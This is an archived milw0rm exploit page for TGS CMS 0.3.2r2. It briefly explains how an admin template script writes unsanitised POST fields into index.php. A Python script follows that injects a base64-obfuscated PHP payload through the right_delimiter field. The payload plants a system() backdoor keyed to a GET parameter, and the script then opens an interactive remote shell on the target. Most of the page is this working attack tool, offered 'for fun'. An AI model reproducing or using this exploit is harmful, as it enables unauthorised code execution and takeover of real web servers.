<html><head><title>TGS CMS 0.3.2r2 Remote Code Execution Exploit</title></head><pre>#			TGS CMS Remote Code Execution Exploit
#					by 0in
#				from Dark-Coders Group!
#				  www.dark-coders.pl
# Contact: 0in(dot)email[at]gmail(dot)com
# Greetings to:die_angel,suN8Hclf,m4r1usz,cOndemned,str0ke
# Dork:NULL - because &quot;You cannot kill what you did not create&quot; &lt;- Duality by Slipknot
# Let's analyze the vuln:
# We've got the: /cms/admin/admin.template_engine.php 
# first line:&quot;&lt;?&quot; 
# next 2-22 lines - comments
# 23: if ($_GET['option'] == &quot;set_template&quot;) { 
# 24: $filename = &quot;../index.php&quot;;
# 25: if ((@is_writeable($filename)) &amp;&amp; ($handle = @fopen($filename, &quot;w&quot;))) {
# From 50 line to 88 we have definition of file content 
# 50: $content = '&lt;?php // here programmer define the file to save in &quot;../index.php&quot;
# but...
# he.. don't think xD
# 77:$tgs_template-&gt;template_dir    = &quot;'.$_POST['template_dir'].'&quot;; 
# 78:$tgs_template-&gt;config_dir      = &quot;'.$_POST['config_dir'].'&quot;; 
# 79:$tgs_template-&gt;cms_dir		  = &quot;'.$_POST['cms_dir'].'&quot;;
# 80:$tgs_template-&gt;left_delimiter  = &quot;'.$_POST['left_delimiter'].'&quot;;
# 81:$tgs_template-&gt;right_delimiter = &quot;'.$_POST['right_delimiter'].'&quot;;
# And.. boom!
# 89:	if (@fwrite($handle,$content)) {
# Just simply exploit for fun:
import httplib
import urllib
print &quot;TGS CMS Remote Code Execution Exploit&quot;
print &quot;by 0in From Dark-Coders Group&quot;
print &quot;www.dark-coders.pl&quot;
print 'Enter target:'
target=raw_input()
print 'Enter path:'
path=raw_input()
inject=&quot;\&quot;;error_reporting(0);eval(base64_decode(\&quot;JGNtZD0kX0dFVFsnenVvJ107c3lzdGVtKCRjbWQpO2V4aXQ7\&quot;));//&quot;
exploit=httplib.HTTPConnection(target+':80')
headers={'Content-type':'application/x-www-form-urlencoded',&quot;Accept&quot;:&quot;text/plain&quot;}
data=urllib.urlencode({'right_delimiter':inject})
exploit.request(&quot;POST&quot;,path+&quot;/cms/admin/admin.template_engine.php?option=set_template&quot;,data,headers)
print exploit.getresponse().read()
while(1):
	cmd=raw_input(&quot;[shell@&quot;+target+&quot;]#&quot;)
	if(cmd=='exit'):
		quit()
	shell=httplib.HTTPConnection(target+':80')
	shell.request(&quot;GET&quot;,path+&quot;/cms/index.php?zuo=&quot;+cmd)
	print shell.getresponse().read()

# milw0rm.com [2008-08-03]</pre></html>